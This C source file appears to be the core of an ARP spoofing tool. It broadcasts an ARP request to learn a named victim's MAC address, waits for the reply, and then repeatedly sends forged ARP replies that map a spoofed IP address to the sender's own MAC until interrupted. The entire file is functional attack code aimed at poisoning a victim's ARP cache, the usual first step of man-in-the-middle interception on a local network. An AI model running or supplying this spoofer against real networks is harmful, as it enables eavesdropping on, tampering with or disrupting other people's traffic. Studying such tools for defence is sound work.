#include "network/network.h"

int send_packet_to_brodcast(const int sock, struct sockaddr_ll *device,
                            const uint8_t *my_mac_address,
                            const char *spoofed_ip_source, const char *victim_ip)
{
    t_ether_tram ether_tram;
    t_arp_packet arp_packet;

    if (create_arp_packet(&arp_packet, ARPOP_REQUEST,
                          ETH_BRODCAST, victim_ip,
                          my_mac_address, spoofed_ip_source))
    {
        error("create_arp_packet():");
        return 1;
    }
    else if (create_ethernet_trame(&ether_tram, ETH_BRODCAST, my_mac_address, &arp_packet))
    {
        error("create_ethernet_tram():");
        return 1;
    }
    else if (sendto(sock, &ether_tram,
                    ETH_HEADER_LENGTH + ARP_HEADER_LENGTH, 0,
                    (const struct sockaddr *)device, sizeof(*device)) < 0)
    {
        error("sendto():");
        return 1;
    }
    printf("[+] Send packet to brodcast\n");

    return 0;
}

int get_victim_response(const int sock, const char *victim_ip, uint8_t *victim_mac_address)
{
    int rep = 1;
    char buffer[IP_MAXPACKET];
    t_arp_packet arp_packet;
    t_ether_tram ether_tram;
    char ip_str[INET_ADDRSTRLEN] = {0};
    printf("\t[*] Listening target response\n");
    while (rep)
    {
        if (recv(sock, buffer, IP_MAXPACKET, 0) < 0)
        {
            return 1;
        }
        else
        {
            memcpy(&ether_tram, buffer, sizeof(t_ether_tram));
            if (ntohs(ether_tram.ether_type) == ETH_P_ARP)
            {
                arp_packet = ether_tram.arp_packet;
                if (inet_ntop(AF_INET, arp_packet.sender_ip, ip_str, INET_ADDRSTRLEN) < 0)
                    error("inet_ntop():");
                else if (ntohs(arp_packet.operation) == ARPOP_REPLY && strcmp(ip_str, victim_ip) == 0)
                {
                    memcpy(victim_mac_address, arp_packet.sender_mac, ETH_ADD_L * sizeof(uint8_t));
                    rep = 0;
                }
            }
        }
    }

    printf("[+] Got response from victim\n");
    printf("\t[*] Sender MAC adress: ");
    PRINT_MAC_ADDRESS(arp_packet.sender_mac);
    printf("\t[*] Sender ip address: ");
    PRINT_IP_ADDRESS(arp_packet.sender_ip);
    printf("\t[*] Target mac address: ");
    PRINT_MAC_ADDRESS(arp_packet.target_mac);
    printf("\t[*] Target ip address: ");
    PRINT_IP_ADDRESS(arp_packet.target_ip);

    printf("[+] victime mac adress : ");
    PRINT_MAC_ADDRESS(victim_mac_address);

    return 0;
}

static int run = 1;

void stop(int sig)
{
    run = 0;
}

int repeated_sending(int sock, struct sockaddr_ll *device,
                     const uint8_t *my_mac_address, const char *spoofed_ip,
                     const uint8_t *victim_mac_adres, const char *victim_ip)
{
    t_ether_tram ether_tram;
    t_arp_packet arp_packet;

    if (create_arp_packet(&arp_packet, ARPOP_REPLY,
                          victim_mac_adres, victim_ip,
                          my_mac_address, spoofed_ip))
    {
        error("create_arp_packet():");
        return 1;
    }
    else if (create_ethernet_trame(&ether_tram, victim_mac_adres, my_mac_address, &arp_packet))
    {
        error("create_ethernet_tram():");
        return 1;
    }
    else
    {
        signal(SIGINT, stop);
        while (run)
        {
            if (sendto(sock, &ether_tram,
                       ETH_HEADER_LENGTH + ARP_HEADER_LENGTH, 0,
                       (const struct sockaddr *)device, sizeof(*device)) < 0)
            {
                error("sendto():");
                return 1;
            }
            printf("[+] SPOOFED Packet sent to '%s'\n", victim_ip);
            sleep(SEND_TIME);
        }

        return 0;
    }
}